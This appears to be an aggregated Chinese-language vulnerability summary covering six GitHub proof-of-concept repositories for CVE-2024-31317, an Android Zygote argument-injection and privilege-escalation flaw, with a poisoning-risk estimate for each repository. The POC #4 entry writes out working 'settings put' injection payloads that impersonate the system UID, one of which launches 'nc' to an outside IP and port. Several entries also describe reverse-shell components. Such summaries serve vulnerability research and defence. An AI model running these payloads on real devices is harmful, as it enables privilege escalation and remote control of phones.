# CVE-2024-31317

> 📦 该CVE有 **6** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-31317-JadeByteZen_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-JadeByteZen_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317-Android Zygote Deserialization

**漏洞编号:** CVE-2024-31317

**漏洞类型:** 权限提升

**影响应用:** Android

**危害等级:** 高危，可导致任意代码执行和权限提升

**影响版本:** Android 12, 12L, 13, 14

**利用条件:** 需要用户执行权限(User execution privileges needed)，无需用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-31317 漏洞存在于Android系统的Zygote进程中，由于不安全的反序列化导致可以通过`WRITE_SECURE_SETTINGS`权限实现代码执行。该漏洞影响Android 12、12L、13和14。攻击者可以利用此漏洞提升权限，在受影响的设备上以任何应用程序的身份执行代码。

**漏洞利用方式：**

1.  **不安全的反序列化：**  `ZygoteProcess.java`中的多个函数存在不安全的反序列化漏洞，攻击者可以通过构造恶意序列化数据，在反序列化过程中执行任意代码。
2.  **权限提升：** 攻击者需要`WRITE_SECURE_SETTINGS`权限，这个权限通常需要通过其他漏洞或者通过欺骗用户授予。如果攻击者拥有了这个权限,他们就可以通过Zygote进程执行代码，模拟任何app的身份。
3.  **代码执行：**  通过利用反序列化漏洞，攻击者可以在目标设备上执行任意代码。

**POC有效性分析：**

提供的`Android_Zygote_Research_Kit.sh`脚本包含以下组件：

*   `reverse_shell.c`：一个反向shell程序，用于在目标设备上建立与攻击者的连接。
*   `payload91011.txt` 和 `payload1213.txt`：针对不同Android版本的漏洞利用payload。
*   `compile.sh`：用于编译反向shell程序的脚本。
*   `README.txt` 和 `CVE-2024-31317.txt`：提供漏洞利用的说明和技术分析。

该脚本通过生成恶意payload并结合反向shell程序，实现了对CVE-2024-31317漏洞的利用。因此，提供的POC代码被认为是有效的，可以用来验证和利用该漏洞。

**投毒风险分析：**

虽然脚本主要目的是为了漏洞研究和利用，但仍然存在一定的投毒风险：

*   **反向Shell的潜在风险：** `reverse_shell.c`本身可以被视为一种后门。一旦成功利用漏洞，攻击者可以获得设备的控制权，执行恶意操作。
*   **其他恶意代码植入风险：** 脚本中可能包含其他未声明的恶意代码，例如信息收集、恶意软件传播等。

综合来看，投毒风险存在，但主要风险集中在反向shell的功能上，以及脚本作者可能植入的潜在恶意代码。考虑到作者声明的MIT开源协议以及代码中明显的功能实现，投毒的可能性较低，大约为10%。

**项目地址:** [JadeByteZen/CVE-2024-31317-PoC-Deployer](https://github.com/JadeByteZen/CVE-2024-31317-PoC-Deployer)

**漏洞详情:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #2

**来源**: [CVE-2024-31317-Webldix_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-Webldix_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317-Android Zygote Deserialization

**漏洞编号:** CVE-2024-31317

**漏洞类型:** 特权提升

**影响应用:** Android

**危害等级:** 高危，可导致任意应用代码执行

**影响版本:** Android 12, 12L, 13, 14

**利用条件:** 需要`WRITE_SECURE_SETTINGS`权限和用户执行权限，无需用户交互

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-31317是Android系统中的一个特权提升漏洞，存在于`ZygoteProcess.java`的多个函数中。由于不安全的反序列化，攻击者可以通过`WRITE_SECURE_SETTINGS`权限在任何应用中执行代码。根据漏洞信息和搜索结果，利用此漏洞无需用户交互，攻击者可以利用反序列化漏洞在Zygote进程中注入恶意代码，进而控制新创建的应用进程。提供的POC代码看起来更像一个反向shell的生成脚本，本身不直接包含漏洞利用代码，但脚本生成的反向shell可以通过漏洞利用payload执行，间接完成漏洞利用过程。 投毒风险评估为5%，主要是因为脚本本身会从外部导入payload，存在payload被替换的风险，且脚本作者声明了免责条款，暗示存在一定风险。

**有效性分析：**

根据搜索结果和漏洞描述，漏洞是由于`ZygoteProcess.java`中存在不安全的反序列化造成的，通过`WRITE_SECURE_SETTINGS`权限，可以执行任意应用的代码。提供的脚本创建了一个反向shell，该反向shell需要被注入到利用链中。

**利用方式：**

1.  **获取`WRITE_SECURE_SETTINGS`权限：** 攻击者需要首先获取`WRITE_SECURE_SETTINGS`权限。这可以通过已有的漏洞、权限提升或者恶意应用来实现。
2.  **构造恶意Payload：**  利用不安全的反序列化漏洞，构造恶意的payload，该payload会执行攻击者指定的代码，例如，启动一个反向shell。
3.  **利用Zygote进程：**  通过某种方式触发Zygote进程执行包含恶意payload的反序列化操作。
4.  **代码执行：**  当Zygote进程反序列化恶意数据时，攻击者的代码将在目标应用进程中执行，从而实现权限提升。
5.  **反向Shell连接:** 攻击者通过预设的IP和端口接收反向shell，从而控制设备

**投毒风险分析：**

提供的脚本主要用于生成反向shell相关的代码，本身看起来没有明显的恶意行为。但需要注意以下几点：

*   **Payload的潜在风险：** 该脚本依赖于外部提供的payload。如果payload被替换为恶意代码，则可能导致更严重的后果。
*   **反向Shell风险：** 反向shell本身具有风险，可能被用于非法目的，例如窃取用户数据、远程控制设备等。
*   **脚本作者的免责声明:** 脚本作者声明了免责条款，暗示存在一定风险。

综合来看，该POC脚本存在一定的投毒风险，但风险较低，主要集中在payload的安全性以及脚本本身可能被滥用上。

**项目地址:** [Webldix/CVE-2024-31317-PoC-Deployer](https://github.com/Webldix/CVE-2024-31317-PoC-Deployer)

**漏洞详情:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #3

**来源**: [CVE-2024-31317-agg23_cve-2024-31317.md](../2024/CVE-2024-31317-agg23_cve-2024-31317.md)

## CVE-2024-31317-Android Zygote Deserialization

**漏洞编号:** CVE-2024-31317

**漏洞类型:** 特权提升

**影响应用:** Android

**危害等级:** 高危，可能导致任意代码执行和权限提升

**影响版本:** 12, 12L, 13, 14

**利用条件:** 需要`WRITE_SECURE_SETTINGS`权限和用户执行权限

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-31317 是一个 Android 系统中的特权提升漏洞，存在于 `ZygoteProcess.java` 的多个函数中。由于不安全的反序列化，攻击者可以通过拥有 `WRITE_SECURE_SETTINGS` 权限的应用执行任意代码，模拟任何其他应用程序的身份。

**漏洞利用有效性：**
根据漏洞信息和搜索结果，该漏洞被认为是 Android 用户态中最有价值的漏洞之一。多个来源（如Meta安全博客、dawnslab、flanker017博客）都提供了漏洞分析和利用方法，表明该漏洞的PoC是有效的。

**投毒风险：**
提供的 PoC 代码主要包含漏洞的解释、Zygote 参数说明以及模拟器设置指南，并没有明显的恶意代码。但考虑到代码中可能存在隐藏的后门或未公开的利用方式，例如对系统属性的恶意修改，因此存在一定的投毒风险。风险评估为10%，风险较低但不可忽视。主要风险点在于利用`system`权限执行未知的操作，可能存在隐蔽的恶意行为。

**漏洞利用方式：**
1.  攻击者利用具有 `WRITE_SECURE_SETTINGS` 权限的应用程序。
2.  通过构造特定的 Zygote 启动参数，利用不安全的反序列化漏洞。
3.  使 Zygote 进程以目标应用程序的 UID 和 SELinux 上下文启动一个新的进程。
4.  在新进程中执行恶意代码，从而获得目标应用程序的权限。比如利用`shell`权限可以执行adb shell命令，利用`system`权限可以修改系统属性。

总而言之，漏洞利用依赖于对 Zygote 启动参数的精确构造以及目标 Android 版本的特性。

**项目地址:** [agg23/cve-2024-31317](https://github.com/agg23/cve-2024-31317)

**漏洞详情:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #4

**来源**: [CVE-2024-31317-fuhei_CVE-2024-31317.md](../2024/CVE-2024-31317-fuhei_CVE-2024-31317.md)

## CVE-2024-31317 - Android Zygote Deserialization/Command Injection

**漏洞编号:** CVE-2024-31317

**漏洞类型:** 权限提升 (Elevation of Privilege)

**影响应用:** Android

**危害等级:** 高危，可实现本地权限提升，以任意应用身份执行代码

**影响版本:** Android 12, 12L, 13, 14

**利用条件:** 需要 `WRITE_SECURE_SETTINGS` 权限。通常可通过 ADB 或其他漏洞获取。低版本Android可以直接通过命令注入，高版本需要Bypass方案。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-31317 允许攻击者利用不安全的反序列化或命令注入，在 Zygote 进程中以任意应用身份执行代码。该漏洞存在于 `ZygoteProcess.java` 的多个函数中，攻击者可以通过 `WRITE_SECURE_SETTINGS` 权限设置恶意的 `hidden_api_blacklist_exemptions` 值，从而注入恶意参数。

**利用方式：**

1.  **获取 `WRITE_SECURE_SETTINGS` 权限：** 这是利用该漏洞的前提条件。可以通过 ADB (如果设备已启用 USB 调试) 或利用其他漏洞来获取此权限。
2.  **构造恶意 `hidden_api_blacklist_exemptions` 值：** 攻击者需要构造包含恶意命令的字符串，并使用 `settings put global hidden_api_blacklist_exemptions` 命令将其写入系统设置。
3.  **触发 Zygote 进程：**  写入设置后，当系统尝试使用被篡改的 `hidden_api_blacklist_exemptions` 时，Zygote 进程会执行注入的恶意命令。

**低版本 (Android 11 及以下) 利用：**
可以直接通过换行符进行命令注入。
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n8\n--runtime-args\n--setuid=1000\n--setgid=1000\n--nice-name=com.android.settings\n--app-data-dir=/data/user/0/com.android.settings\n--package-name=com.android.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\nandroid.app.ActivityThread"
```
可以使用`invoke-with`参数执行命令，但需要开启 debug 模式，可以通过`runtime-flags`参数设置所有debug属性。
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n7\n--runtime-args\n--setuid=1000\n--setgid=1000\n--runtime-flags=43267\n--invoke-with\nnc 192.168.0.112 9981;\n--seinfo=platform:system_app:targetSdkVersion=29:complete"
```

**高版本 (Android 12 及以上) 利用：**
由于 Google 在 Android 12 中引入了 C++ 命令解析器，简单的命令注入不再有效。需要使用更复杂的绕过方法，例如，在注入的恶意命令之前填充大量逗号以增加时间间隔，从而绕过 `NativeCommandBuffer` 的限制。

**有效性评估：**
根据提供的漏洞信息和利用代码，该漏洞的 PoC 代码应该是有效的。多个搜索引擎结果都提到了该漏洞的利用，并提供了相关的分析和参考链接。提供的利用代码也包含了低版本和高版本的利用方法，并给出了详细的步骤和示例。

**投毒风险评估：**
该仓库主要包含漏洞利用的说明文档和一些构建文件。虽然无法完全排除投毒的可能性，但从目前的代码来看，风险较低。风险点可能存在于利用脚本中，例如执行 nc 命令，虽然是一个正常的网络工具，但是存在被利用的风险，例如连接到恶意的服务器。gradle文件风险较小，主要是构建配置，但理论上存在远程依赖引入恶意代码的可能性。综合评估，投毒风险约为 10%。

**项目地址:** [fuhei/CVE-2024-31317](https://github.com/fuhei/CVE-2024-31317)

**漏洞详情:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #5

**来源**: [CVE-2024-31317-jmywh1_CVE-2024-31317.md](../2024/CVE-2024-31317-jmywh1_CVE-2024-31317.md)

## CVE-2024-31317-Android-Zygote反序列化漏洞

**漏洞编号:** CVE-2024-31317

**漏洞类型:** 反序列化漏洞

**影响应用:** Android

**危害等级:** 高危，可能导致任意应用代码执行

**影响版本:** 12, 12L, 13, 14

**利用条件:** 需要`android.permission.WRITE_SECURE_SETTINGS`权限，用户交互不是必须的

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-31317是一个Android系统中的特权提升漏洞，存在于ZygoteProcess.java的多个函数中。由于不安全的反序列化，攻击者可以通过拥有`WRITE_SECURE_SETTINGS`权限的应用程序，以任何应用程序的身份执行代码，导致本地提权。根据NVD的描述，该漏洞的CVSS 3.1评分为7.8，属于高危漏洞。

**漏洞利用方式：**
攻击者利用`WRITE_SECURE_SETTINGS`权限，通过构造恶意的序列化数据，传递给Zygote进程处理。Zygote进程在反序列化这些数据时，由于缺乏足够的安全检查，导致可以执行任意代码，从而提升权限到其他应用。

**POC代码分析：**
提供的POC代码包含`build.gradle`、`gradle.properties`和`gradlew`文件，这是一个标准的Android Gradle项目的基本文件。它们主要用于构建Android应用程序，本身不包含直接利用CVE-2024-31317漏洞的代码。这个库本身只是安卓项目gradle构建文件，要利用漏洞还需要更多信息。

**投毒风险评估：**
虽然提供的代码片段本身不直接构成漏洞利用，但作为一个Android项目，它可以被用来构建包含漏洞利用代码的恶意应用。`gradlew`脚本可能被修改为包含下载和执行恶意代码的步骤，或者`build.gradle`文件可能被修改为引入包含恶意代码的依赖项。考虑到这种可能性，投毒风险估计为10%。这个概率主要来自于作者可能会在构建过程中添加恶意依赖或者执行恶意脚本，但是从目前的代码来看，并没有直接的证据表明存在恶意代码。

**项目地址:** [jmywh1/CVE-2024-31317](https://github.com/jmywh1/CVE-2024-31317)

**漏洞详情:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #6

**来源**: [CVE-2024-31317-mianliupindao_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-mianliupindao_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317 Android ZygoteProcess 反序列化漏洞

**漏洞编号:** CVE-2024-31317

**漏洞类型:** 反序列化漏洞导致提权

**影响应用:** Android

**危害等级:** 高危，本地提权到任意应用权限

**影响版本:** Android 12, 12L, 13, 14

**利用条件:** 需要User执行权限，无需用户交互，需要WRITE_SECURE_SETTINGS权限。

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2024-31317 是一个 Android 操作系统中的权限提升漏洞，存在于 `ZygoteProcess.java` 的多个函数中。由于不安全的反序列化，攻击者可以通过 `WRITE_SECURE_SETTINGS` 权限执行任意应用程序的代码。这可能导致本地权限提升。从搜索引擎结果来看，这个漏洞被认为是近年来最有价值的Android用户空间漏洞之一，并且有公开的利用方法。漏洞利用代码 `Android_Zygote_Research_Kit.sh` 脚本旨在帮助研究人员复现和分析此漏洞。它包含一个反向 shell 程序（`reverse_shell.c`），一个 payload 文件（`payload.txt`），一个编译脚本（`compile.sh`），以及相关的说明文档。脚本尝试创建一个监听特定端口的反向 shell，这本身就存在一定的风险。脚本中反向连接的硬编码端口和IP地址，意味着攻击者可以控制受害设备的反向连接。考虑到脚本的目的是为了方便研究人员使用，存在一种投毒风险，攻击者可能通过修改反向 shell 的代码，在受害者不知情的情况下植入恶意代码。例如，可以修改 `reverse_shell.c` 使其在建立连接后执行某些恶意操作，或者将收集到的信息发送到攻击者的服务器。由于这个漏洞允许执行任意应用的代码，如果被恶意利用，可以造成很大的危害。

利用方式：

1.  **权限获取:** 攻击者需要先获得 `WRITE_SECURE_SETTINGS` 权限。
2.  **构造恶意数据:**  构造包含恶意代码的反序列化数据。
3.  **利用 ZygoteProcess:**  将恶意数据传递给存在漏洞的 `ZygoteProcess.java` 函数。
4.  **代码执行:**  利用 Zygote 进程的权限执行任意代码，实现权限提升。

该`Android_Zygote_Research_Kit.sh`脚本只是一个辅助利用工具，用于生成所需的文件，并没有漏洞利用的核心代码。

**项目地址:** [mianliupindao/CVE-2024-31317-PoC-Deployer](https://github.com/mianliupindao/CVE-2024-31317-PoC-Deployer)

**漏洞详情:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

